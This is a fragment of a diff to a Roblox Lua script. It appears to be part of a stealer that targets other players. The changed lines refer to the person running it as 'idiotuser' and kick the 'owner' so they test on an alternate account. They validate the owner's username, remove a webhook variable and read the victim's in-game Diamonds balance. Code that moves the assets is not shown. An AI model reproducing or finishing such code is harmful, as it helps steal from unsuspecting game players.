@@ -79,18 +79,24 @@ end
 getexploit()
 
 local idiotuser = game:GetService("Players").LocalPlayer.Name
-local url = Webhook
-if UserName == nil then
-    game:GetService("Players").LocalPlayer:Kick("Put A Username")
+
+if idiotuser == UserName then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
     return;
 end
-local worked = pcall(function()
-    game:GetService("Players"):GetNameFromUserIdAsync(UserName)
-end)
-local UserName = game:GetService("Players"):GetNameFromUserIdAsync(UserName)
-if idiotuser == UserName then
-    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    return;
 end
+local worked2 = pcall(function()
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end)
+if not worked2 then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+    return;
+end
+
+local diaamt99 = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
 -- Checks
 
 
